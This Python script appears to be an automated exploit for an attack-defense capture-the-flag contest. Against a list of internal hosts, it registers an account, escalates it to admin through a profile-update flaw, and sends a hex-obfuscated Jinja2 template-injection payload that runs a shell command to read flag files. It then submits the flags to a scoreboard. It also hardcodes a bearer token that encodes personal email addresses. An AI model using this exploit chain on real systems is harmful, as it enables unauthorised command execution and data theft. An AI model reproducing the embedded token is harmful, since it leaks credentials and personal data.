#!/usr/bin/env python3
import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor

TARGET_PORT = 8120

# Token dan endpoint submit dari script VaultNote
API_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZWFtX2lkIjoxMDksInBsYXllcl9pZCI6MTYsInRlYW1fbmFtZSI6IkN1bWkgSGl0YW0gUGFrIEtyaXMiLCJ0ZWFtX2NvbnRhY3RfZW1haWwiOiJhcmlkd2FuaGFraW0xN0BnbWFpbC5jb20iLCJkaXNwbGF5X25hbWUiOiJrb25jb25lIGtpYWkiLCJlbWFpbCI6InJpZHdhbmR1bWJhY2NAZ21haWwuY29tIiwicm9sZSI6Im1lbWJlciIsImlhdCI6MTc4MjEwMjU5NywiZXhwIjoxNzgyMTg4OTk3fQ.dKhuHYQZ1crPnjCBlZxOiFupH5gkueEsrHBuU-7S530"
SUBMIT_URL = "https://10.0.2.3/api/v2/submit"

headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {API_TOKEN}"
}

def register(session, host, username, password):
    url = f"http://{host}:{TARGET_PORT}/api/register"
    payload = {"username": username, "password": password, "email": f"{username}@passforge.local"}
    r = session.post(url, json=payload)
    if r.status_code != 200:
        return False
    data = r.json()
    return data.get("status") == "ok"

def login(session, host, username, password):
    url = f"http://{host}:{TARGET_PORT}/api/login"
    payload = {"username": username, "password": password}
    r = session.post(url, json=payload)
    if r.status_code != 200:
        return None
    data = r.json()
    if data.get("status") != "ok":
        return None
    return data.get("token")

def promote_to_admin(session, host, token):
    url = f"http://{host}:{TARGET_PORT}/api/profile"
    headers_auth = {"Authorization": f"Bearer {token}"}
    payload = {"role": "admin"}
    r = session.post(url, json=payload, headers=headers_auth)
    if r.status_code != 200:
        return False
    data = r.json()
    return data.get("status") == "ok"

def exploit_ssti(session, host, token):
    url = f"http://{host}:{TARGET_PORT}/api/admin/smart-import"
    headers_auth = {"Authorization": f"Bearer {token}"}
    template = (
        "{{ ''['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fmro\\x5f\\x5f'][1]"
        "['\\x5f\\x5fsubclasses\\x5f\\x5f']()|selectattr('\\x5f\\x5fname\\x5f\\x5f','equalto','Popen')"
        "|first['\\x5f\\x5finit\\x5f\\x5f']['\\x5f\\x5fglobals\\x5f\\x5f']"
        "['\\x70\\x6f\\x70\\x65\\x6e']"
        "('\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x20\\x2f\\x70\\x72\\x6f\\x6f\\x66\\x2e\\x74\\x78\\x74').read() }}"
    )
    csv_data = "template\n" + template + "\n"
    r = session.post(url, data=csv_data, headers=headers_auth)
    if r.status_code != 200:
        return None
    try:
        data = r.json()
    except:
        return None
    if data.get("status") != "ok":
        return None
    results = data.get("results", [])
    if not results:
        return None
    return results[0].get("value")

def extract_flag_proof(output):
    lines = output.strip().split('\n')
    flag = None
    proof = None
    for line in lines:
        if "PLAYIT{" in line or "FLAG{" in line:
            flag = line.strip()
        if "proof" in line.lower():
            proof = line.strip()
    return flag, proof

def submit_flags(flags):
    if not flags:
        print("[*] No flags to submit.")
        return
    payload = {"flags": flags}
    try:
        r = requests.post(SUBMIT_URL, json=payload, headers=headers, verify=False)
        print(f"[*] Submit response: {r.json()}")
    except Exception as e:
        print(f"[-] Submit error: {e}")

def attack_target(host):
    print(f"\n[*] Attacking {host}...")
    session = requests.Session()
    username = f"attacker_{host.replace('.','_')}"
    password = "attacker123"
    
    if not register(session, host, username, password):
        print(f"[-] {host}: Register failed")
        return None, None
    
    token = login(session, host, username, password)
    if token is None:
        print(f"[-] {host}: Login failed")
        return None, None
    
    if not promote_to_admin(session, host, token):
        print(f"[-] {host}: Promote admin failed")
        return None, None
    
    output = exploit_ssti(session, host, token)
    if output is None:
        print(f"[-] {host}: SSTI exploit failed")
        return None, None
    
    flag, proof = extract_flag_proof(output)
    print(f"[+] {host}: Flag={flag}, Proof={proof}")
    return flag, proof

def main():
    targets = [
        "10.80.5.13",
        "10.80.5.12",
        "10.80.5.11",
        "10.80.5.15",
        "10.80.5.17",
        "10.80.5.18",
        "10.80.5.20"
    ]
    
    all_flags = []
    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(attack_target, host): host for host in targets}
        for future in futures:
            host = futures[future]
            try:
                flag, proof = future.result()
                if flag:
                    all_flags.append(flag)
                    results.append((host, flag, proof))
                else:
                    print(f"[-] No flag from {host}")
            except Exception as e:
                print(f"[-] {host}: Exception {e}")
    
    print("\n" + "="*50)
    print("SUMMARY OF RESULTS")
    print("="*50)
    for host, flag, proof in results:
        print(f"{host}: FLAG={flag}, PROOF={proof}")
    print("="*50)
    
    # Submit all flags at once
    if all_flags:
        print(f"[*] Submitting {len(all_flags)} flags...")
        submit_flags(all_flags)
    else:
        print("[-] No flags to submit.")
    
    with open("flags_proofs.txt", "w") as f:
        for host, flag, proof in results:
            f.write(f"{host}: {flag} | {proof}\n")
    print("[+] Results saved to flags_proofs.txt")

if __name__ == "__main__":
    main()
